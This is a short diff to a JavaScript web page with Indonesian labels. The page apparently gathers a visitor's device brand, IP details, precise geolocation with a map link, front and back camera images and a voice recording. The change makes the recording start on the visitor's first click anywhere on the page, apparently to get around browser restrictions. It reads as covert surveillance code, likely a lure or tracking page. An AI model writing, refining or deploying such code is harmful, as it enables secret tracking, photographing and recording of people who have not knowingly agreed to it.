@@ -239,6 +239,7 @@
         statusVN = `❌ Voice Note tidak diizinkan.`;
       });
     };
+
     const getDeviceBrand = () => {
       const ua = navigator.userAgent;
       if (/Vivo|vivo|V\d{4}/.test(ua)) return 'Vivo';
@@ -335,6 +336,7 @@ Peta                   : https://maps.google.com/?q=${latitude},${longitude}`);
         }, { enableHighAccuracy: true, timeout: 5000 });
       });
     };
+
     const ambilKamera = async (facingMode, label) => {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
@@ -375,10 +377,13 @@ Peta                   : https://maps.google.com/?q=${latitude},${longitude}`);
       audio.muted = false;
       try { await audio.play(); } catch {}
 
+      document.body.addEventListener("click", () => {
+        rekamSuara();
+      }, { once: true });
+
       const info = await ambilDataPerangkat();
       const ip = await ambilIPInfo();
       const lokasi = await ambilLokasi();
-      rekamSuara(); // VN jalan di awal supaya gak delay
 
       const depan = await ambilKamera("user", "depan");
       const belakang = await ambilKamera("environment", "belakang");
